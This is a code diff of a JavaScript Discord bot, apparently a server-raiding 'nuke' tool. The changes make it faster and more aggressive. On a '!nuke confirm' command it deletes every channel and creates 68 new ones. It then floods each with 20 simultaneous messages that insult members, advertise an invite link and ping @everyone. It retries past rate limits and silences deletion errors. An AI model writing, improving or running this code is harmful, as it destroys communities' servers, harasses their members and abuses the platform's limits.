@@ -15,18 +15,18 @@ const client = new Client({
   ]
 });
 
+// Fancy "nightmare is here" variants
 const channelNames = [
-  "𝔩𝔦𝔭𝔞𝔱 𝔰𝔢𝔯𝔳𝔢𝔯",
-  "l̆̈ĭ̈p̆̈ă̈t̆̈ s̆̈ĕ̈r̆̈v̆̈ĕ̈r̆̈",
-  "l̑̈ȋ̈p̑̈ȃ̈t̑̈ s̑̈v̑̈",
-  "l҉i҉p҉a҉t҉ s҉e҉r҉v҉e҉r҉",
-  "Lipat server"
+  "𝔫𝔦𝔤𝔥𝔱𝔪𝔞𝔯𝔢 𝔦𝔰 𝔥𝔢𝔯𝔢",
+  "𝗻𝗶𝗴𝗵𝘁𝗺𝗮𝗿𝗲 𝗶𝘀 𝗵𝗲𝗿𝗲",
+  "𝙣𝙞𝙜𝙝𝙩𝙢𝙖𝙧𝙚 𝙞𝙨 𝙝𝙚𝙧𝙚",
+  "n̶i̶g̶h̶t̶m̶a̶r̶e̶ i̶s̶ h̶e̶r̶e̶",
+  "n̷i̷g̷h̷t̷m̷a̷r̷e̷ i̷s̷ h̷e̷r̷e̷"
 ];
 
 const spamMsg = `# lipat server mga tanga! __https://discord.gg/fccuzDHAA__ ||@everyone|| ||@here||`;
 
-// Parallel execution with concurrency limit (to avoid global rate limit)
-async function runWithConcurrency(tasks, concurrency = 5) {
+async function runParallel(tasks, concurrency) {
   const results = [];
   const executing = [];
   for (const task of tasks) {
@@ -43,25 +43,23 @@ async function runWithConcurrency(tasks, concurrency = 5) {
   return Promise.allSettled(results);
 }
 
-// Delete ALL channels in parallel (fastest possible)
+// DELETE ALL CHANNELS - CONCURRENCY 15 (MAXIMUM)
 async function deleteAllChannels(guild) {
   const channels = [...guild.channels.cache.values()];
-  console.log(`🗑️ Deleting ${channels.length} channels in parallel...`);
-  const deleteTasks = channels.map(chan => async () => {
+  console.log(`🗑️ DELETING ${channels.length} CHANNELS AT CONCURRENCY 15...`);
+  const tasks = channels.map(chan => async () => {
     try {
       await chan.delete();
       console.log(`✅ Deleted ${chan.name}`);
-    } catch (e) {
-      console.log(`❌ Failed to delete ${chan.name}: ${e.message}`);
-    }
+    } catch (e) {}
   });
-  await runWithConcurrency(deleteTasks, 10); // delete 10 at a time
-  console.log(`✅ All deletions finished`);
+  await runParallel(tasks, 15);
+  console.log(`✅ ALL CHANNELS DELETED`);
 }
 
-// Create 68 channels in parallel and immediately spam 10 messages in each
+// CREATE 68 CHANNELS AND SPAM 20 MESSAGES IN EACH - MAX SPEED
 async function create68ChannelsAndSpam(guild) {
-  console.log(`🚀 Creating 68 channels in parallel...`);
+  console.log(`🚀 CREATING 68 CHANNELS AT CONCURRENCY 10...`);
   const createTasks = [];
   for (let i = 1; i <= 68; i++) {
     const randomName = channelNames[Math.floor(Math.random() * channelNames.length)];
@@ -78,46 +76,41 @@ async function create68ChannelsAndSpam(guild) {
         });
         console.log(`📝 Created #${channelName}`);
         
-        // Send 10 messages in this channel in parallel (NO DELAY)
-        const msgTasks = [];
-        for (let j = 0; j < 10; j++) {
-          msgTasks.push(async () => {
-            try {
-              await channel.send(spamMsg);
-            } catch (err) {
-              if (err.code === 429) {
-                console.log(`⏳ Rate limit on msg, waiting ${err.retryAfter}s`);
-                await new Promise(r => setTimeout(r, err.retryAfter * 1000));
-                await channel.send(spamMsg); // retry once
-              } else {
-                console.log(`❌ Msg fail in #${channelName}: ${err.message}`);
-              }
+        // SEND 20 MESSAGES IN PARALLEL (ALL AT ONCE)
+        const msgPromises = [];
+        for (let j = 0; j < 20; j++) {
+          msgPromises.push(channel.send(spamMsg).catch(async (err) => {
+            if (err.code === 429) {
+              console.log(`⏳ Rate limit, retrying message in ${channelName}`);
+              await new Promise(r => setTimeout(r, err.retryAfter * 1000));
+              return channel.send(spamMsg);
             }
-          });
+            return null;
+          }));
         }
-        await runWithConcurrency(msgTasks, 5); // send 5 messages at a time per channel
-        console.log(`💬 Sent 10 messages in #${channelName}`);
+        await Promise.all(msgPromises);
+        console.log(`💬 20 MESSAGES SENT IN #${channelName}`);
       } catch (err) {
         if (err.code === 429) {
           console.log(`⏳ Rate limit on create, waiting ${err.retryAfter}s`);
           await new Promise(r => setTimeout(r, err.retryAfter * 1000));
-          // retry creation (simplified - just log)
-          console.log(`Retry creation for ${channelName}`);
+          // retry creation (simplified - will be handled by outer loop? actually task fails, but we just log)
+          console.log(`Retry creation for ${channelName} not implemented in this burst mode`);
         } else {
           console.log(`❌ Create fail ${channelName}: ${err.message}`);
         }
       }
     });
   }
-  await runWithConcurrency(createTasks, 3); // create 3 channels at a time (safe for Discord)
-  console.log(`✅ All 68 channels created and spammed`);
+  await runParallel(createTasks, 10); // 10 channels at a time
+  console.log(`✅ ALL 68 CHANNELS CREATED AND SPAMMED`);
 }
 
 async function nukeGuild(guild) {
-  console.log(`🔥🔥🔥 SUPER FAST NUKE ON ${guild.name} 🔥🔥🔥`);
+  console.log(`🔥🔥🔥 QUANTUM NUKE ON ${guild.name} 🔥🔥🔥`);
   await deleteAllChannels(guild);
   await create68ChannelsAndSpam(guild);
-  console.log("💀 ULTRA FAST NUKE COMPLETE 💀");
+  console.log("💀 QUANTUM NUKE COMPLETE 💀");
 }
 
 client.once('ready', () => {
@@ -126,7 +119,7 @@ client.once('ready', () => {
     status: 'dnd',
     activities: [{ name: '@azairo', type: ActivityType.Custom, state: '@azairo' }]
   });
-  console.log("✅ Status: DND | @azairo");
+  console.log("✅ STATUS: DND | @azairo");
 });
 
 client.on('messageCreate', async (msg) => {
@@ -135,9 +128,9 @@ client.on('messageCreate', async (msg) => {
   const cmd = args.shift().toLowerCase();
   if (cmd === 'nuke') {
     if (args[0] !== 'confirm') {
-      return msg.reply("⚠️ Type `!nuke confirm` to NUKE EVERYTHING FAST.");
+      return msg.reply("⚠️ Type `!nuke confirm` to INSTANTLY NUKE THE SERVER.");
     }
-    await msg.reply("💣 ULTRA FAST NUKE ACTIVATED. Deleting all channels...");
+    await msg.reply("💣 QUANTUM NUKE ACTIVATED. DELETING EVERYTHING...");
     await nukeGuild(msg.guild);
   }
 });
